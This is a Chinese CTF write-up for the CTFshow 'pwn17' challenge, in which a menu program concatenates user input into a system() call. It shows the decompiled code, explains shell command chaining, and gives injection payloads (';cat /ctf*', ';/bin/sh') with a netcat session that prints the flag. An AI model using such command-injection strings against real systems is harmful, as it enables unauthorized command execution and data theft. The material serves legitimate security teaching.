> 首先把elf可执行文件复制到linux中，查看位数和保护机制：
> ```
> tasike@tasike-VM:~/Desktop$ file pwn17
> pwn17: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=0e74959dfc02e22b3ae5a08b27abb87340baa7fd, not stripped
> tasike@tasike-VM:~/Desktop$ checksec pwn17
> [*] '/home/tasike/Desktop/pwn17'
>     Arch:     amd64-64-little
>     RELRO:    Full RELRO
>     Stack:    Canary found
>     NX:       NX enabled
>     PIE:      PIE enabled
> ```
>
> pwn17是64位且保护机制全开的动态链接elf文件。
>
> 在本地尝试运行看看是怎么个运行模式：
> ```
> tasike@tasike-VM:~/Desktop$ chmod 777 pwn17
> tasike@tasike-VM:~/Desktop$ ./pwn17
>     ▄▄▄▄   ▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄            ▄▄                           
>   ██▀▀▀▀█  ▀▀▀██▀▀▀  ██▀▀▀▀▀▀            ██                           
>  ██▀          ██     ██        ▄▄█████▄  ██▄████▄   ▄████▄  ██      ██
>  ██           ██     ███████   ██▄▄▄▄ ▀  ██▀   ██  ██▀  ▀██ ▀█  ██  █▀
>  ██▄          ██     ██         ▀▀▀▀██▄  ██    ██  ██    ██  ██▄██▄██ 
>   ██▄▄▄▄█     ██     ██        █▄▄▄▄▄██  ██    ██  ▀██▄▄██▀  ▀██  ██▀ 
>     ▀▀▀▀      ▀▀     ▀▀         ▀▀▀▀▀▀   ▀▀    ▀▀    ▀▀▀▀     ▀▀  ▀▀  
>     * *************************************                           
>     * Classify: CTFshow --- PWN --- 入门                              
>     * Type  : Linux_Security_Mechanisms                               
>     * Site  : https://ctf.show/                                       
>     * Hint  : You should understand the basic command usage of Linux! 
>     * *************************************                           
> 
> How much do you know about Linux commands? 
> 
> 1.id
> 2.ls
> 3.cat /ctfshow_flag
> 4.su
> 5.exit
> 
> Enter the command you want choose:(1.2.3.4 or 5)
> 
> 
> ```
>
> 从运行出来的结果开看，该题目是个菜单程序，分别对选项一一尝试之后，感觉好像就2有点用，并且有以下发现：
> ==当选择选项2的时候：==
>
> - 如果输入 / 后回车，那么可以ls出ctfshow_flag文件
> - 如果输入 ./ 后回车，也可以ls出ctfshow_flag文件
> - 如果什么都不输入，直接回车，也可以ls出ctfshow_flag文件
>
> 接着用ida64打开：
> ```c
> int __cdecl main(int argc, const char **argv, const char **envp)
> {
>   int v4; // [rsp+4h] [rbp-1Ch] BYREF
>   char dest[4]; // [rsp+Ah] [rbp-16h] BYREF
>   char buf[10]; // [rsp+Eh] [rbp-12h] BYREF
>   unsigned __int64 v7; // [rsp+18h] [rbp-8h]
> 
>   v7 = __readfsqword(0x28u);
>   setvbuf(_bss_start, 0LL, 2, 0LL);
>   setvbuf(stdin, 0LL, 1, 0LL);
>   puts(asc_D48);
>   puts(asc_DC0);
>   puts(asc_E40);
>   puts(asc_ED0);
>   puts(asc_F60);
>   puts(asc_FE8);
>   puts(asc_1080);
>   puts("    * *************************************                           ");
>   puts(aClassifyCtfsho);
>   puts("    * Type  : Linux_Security_Mechanisms                               ");
>   puts("    * Site  : https://ctf.show/                                       ");
>   puts("    * Hint  : You should understand the basic command usage of Linux! ");
>   puts("    * *************************************                           ");
>   *(_DWORD *)dest = 790655852;
>   v4 = 0;
>   puts("\nHow much do you know about Linux commands? \n");
>   while ( 1 )
>   {
>     menu();
>     v4 = 0;
>     puts("\nEnter the command you want choose:(1.2.3.4 or 5)\n");
>     __isoc99_scanf("%d", &v4);
>     switch ( v4 )
>     {
>       case 1:
>         system("id");
>         break;
>       case 2:
>         puts("Which directory?('/','./' or the directiry you want?)");
>         read(0, buf, 0xAuLL);
>         strcat(dest, buf);
>         system(dest);
>         puts("Execution succeeded!");
>         break;
>       case 3:
>         sleep(1u);
>         puts("$cat /ctfshow_flag");
>         sleep(1u);
>         puts("ctfshow{");
>         sleep(2u);
>         puts("... ...");
>         sleep(3u);
>         puts("Your flag is ...");
>         sleep(5u);
>         puts("ctfshow{flag is not here!}");
>         sleep(0x14u);
>         puts("wtf?You haven't left yet?\nOk~ give you flag:\nflag is loading......");
>         sleep(114514u);
>         system("cat /ctfshow_flag");
>         break;
>       case 4:
>         sleep(2u);
>         puts("su: Authentication failure");
>         break;
>       case 5:
>         puts("See you!");
>         exit(-1);
>       default:
>         puts("command not found!");
>         break;
>     }
>   }
> }
> ```
>
> 根据代码，很显然确实是只有选项2有用，因此，我们希望利用ls的命令来接着完成cat ctfshow_flag
>
> 但是该怎么完成呢？
>
> ==这就要用到"Linux基础命令的拼接"==
>
> #### 在Linux命令中，分号（ ; ）用于分隔多个命令，允许在一行上顺序执行多个命令。 当使用分号（ ; ）将命令连接在一起时，它们按照从左到右的顺序逐个执行，无论前面的命令是否 成功。这意味着无论前一个命令是否成功执行，后续的命令都将被执行。 例如，考虑以下命令： 在这个例子中， command1 执行完毕后，无论成功与否，接着会执行 command2 ，然后再执行 command3 。这样，多个命令可以按顺序在一行上执行。 或者也可以使用 & 将两条命令拼接在一起可以实现并行执行，即这两条命令将同时在后台执行。命 令之间使用 & 进行分隔。
>
> ```
> command1;command2;command3
> ```
>
> #### 在这个例子中， command1 执行完毕后，无论成功与否，接着会执行 command2 ，然后再执行 command3 。这样，多个命令可以按顺序在一行上执行。 或者也可以使用 & 将两条命令拼接在一起可以实现并行执行，即这两条命令将同时在后台执行。命 令之间使用 & 进行分隔。
>
> ```
> command1 & command2
> ```
>
> #### command1 和 command2 是两个要执行的命令。通过使用 & 将它们连接起来，它们将同时在后台 执行。这种方式下命令的输出可能会相互混合，具体的输出顺序取决于命令的执行速度和系统资源。
>
> 回到题目，要解决这题，选择选项2然后进行拼接，限制了10字节。但是我们完全够用，可以构造出 “;cat /ctf*” “;/bin/sh”等 直接拿取一个shell或者直接读出flag在==Linux中，通配符 * 表示匹配任意长度（包括零长度）的任意字符序列。==
>
> 事实上，输入以下两种均可getshell：
>
> - ```
>   ;cat /ctf*
>   ```
>
> - ```
>   ;cat ctfs*
>   ```
>
> 具体流程如下：
> ```
> tasike@tasike-VM:~/Desktop$ nc pwn.challenge.ctf.show 28262
>     ▄▄▄▄   ▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄            ▄▄                           
>   ██▀▀▀▀█  ▀▀▀██▀▀▀  ██▀▀▀▀▀▀            ██                           
>  ██▀          ██     ██        ▄▄█████▄  ██▄████▄   ▄████▄  ██      ██
>  ██           ██     ███████   ██▄▄▄▄ ▀  ██▀   ██  ██▀  ▀██ ▀█  ██  █▀
>  ██▄          ██     ██         ▀▀▀▀██▄  ██    ██  ██    ██  ██▄██▄██ 
>   ██▄▄▄▄█     ██     ██        █▄▄▄▄▄██  ██    ██  ▀██▄▄██▀  ▀██  ██▀ 
>     ▀▀▀▀      ▀▀     ▀▀         ▀▀▀▀▀▀   ▀▀    ▀▀    ▀▀▀▀     ▀▀  ▀▀  
>     * *************************************                           
>     * Classify: CTFshow --- PWN --- 入门                              
>     * Type  : Linux_Security_Mechanisms                               
>     * Site  : https://ctf.show/                                       
>     * Hint  : You should understand the basic command usage of Linux! 
>     * *************************************                           
> 
> How much do you know about Linux commands? 
> 
> 1.id
> 2.ls
> 3.cat /ctfshow_flag
> 4.su
> 5.exit
> 
> Enter the command you want choose:(1.2.3.4 or 5)
> 
> 2
> Which directory?('/','./' or the directiry you want?)
> ;cat ctfs*
> bin
> boot
> ctfshow_flag
> dev
> etc
> home
> lib
> lib32
> lib64
> media
> mnt
> opt
> proc
> pwn
> root
> run
> sbin
> srv
> start.sh
> sys
> tmp
> usr
> var
> ctfshow{fc19f72f-53f8-4cfb-92c2-fb81465a1cff}
> ctfshow{fc19f72f-53f8-4cfb-92c2-fb81465a1cff}
> Execution succeeded!
> 1.id
> 2.ls
> 3.cat /ctfshow_flag
> 4.su
> 5.exit
> 
> Enter the command you want choose:(1.2.3.4 or 5)
> 
> ^C
> tasike@tasike-VM:~/Desktop$ 
> ```
>
> 